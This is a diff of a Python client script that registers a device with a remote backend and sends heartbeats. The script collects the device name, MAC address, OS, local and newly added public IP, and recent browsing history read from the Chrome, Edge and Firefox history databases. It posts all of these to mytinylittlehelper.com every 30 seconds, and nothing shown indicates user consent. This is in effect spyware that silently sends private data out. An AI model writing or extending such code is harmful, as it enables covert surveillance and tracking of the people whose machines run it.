@@ -15,7 +15,7 @@ import json
 # CONFIG
 # =====================================================
 
-BACKEND_BASE = "https://mytinylittlehelper.com"  # use your real backend
+BACKEND_BASE = "https://mytinylittlehelper.com"  # your real backend
 REGISTER_ENDPOINT = f"{BACKEND_BASE}/add_device_advanced_token"
 HEARTBEAT_ENDPOINT = f"{BACKEND_BASE}/device_heartbeat"
 HEARTBEAT_INTERVAL = 30  # seconds
@@ -68,6 +68,19 @@ def get_local_ip():
     except Exception:
         return "unknown"
 
+def get_public_ip():
+    try:
+        r = requests.get("https://api.ipify.org?format=json", timeout=5)
+        return r.json().get("ip", "unknown")
+    except Exception:
+        return "unknown"
+
+def get_ip():
+    public_ip = get_public_ip()
+    local_ip = get_local_ip()
+    log(f"IP detected - Public: {public_ip}, Local: {local_ip}")
+    return public_ip if public_ip != "unknown" else local_ip
+
 def get_mac():
     mac_num = uuid.getnode()
     return ":".join(f"{(mac_num >> ele) & 0xff:02x}" for ele in range(40, -1, -8))
@@ -103,7 +116,6 @@ def read_sqlite_safely(db_path, query, limit=10):
 
 def chrome_edge_history(browser="chrome", limit=10):
     history = []
-
     base = Path(os.environ.get("LOCALAPPDATA", ""))
     if browser == "chrome":
         db = base / r"Google\Chrome\User Data\Default\History"
@@ -124,7 +136,6 @@ def chrome_edge_history(browser="chrome", limit=10):
 def firefox_history(limit=10):
     history = []
     base = Path(os.environ.get("APPDATA", "")) / "Mozilla" / "Firefox" / "Profiles"
-
     if not base.exists():
         return history
 
@@ -135,10 +146,8 @@ def firefox_history(limit=10):
             "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT ?",
             limit
         )
-
         for url, title in rows:
             history.append({"browser": "firefox", "url": url, "title": title})
-
         if history:
             break
 
@@ -159,7 +168,7 @@ def register_device():
     payload = {
         "token": DEVICE_TOKEN,
         "device_name": get_device_name(),
-        "ip": get_local_ip(),
+        "ip": get_ip(),
         "mac": get_mac(),
         "os": get_os(),
         "recent_sites": get_recent_sites()
@@ -181,7 +190,7 @@ def send_heartbeat():
     payload = {
         "token": DEVICE_TOKEN,
         "device_name": get_device_name(),
-        "ip": get_local_ip(),
+        "ip": get_ip(),
         "mac": get_mac(),
         "recent_sites": get_recent_sites()
     }
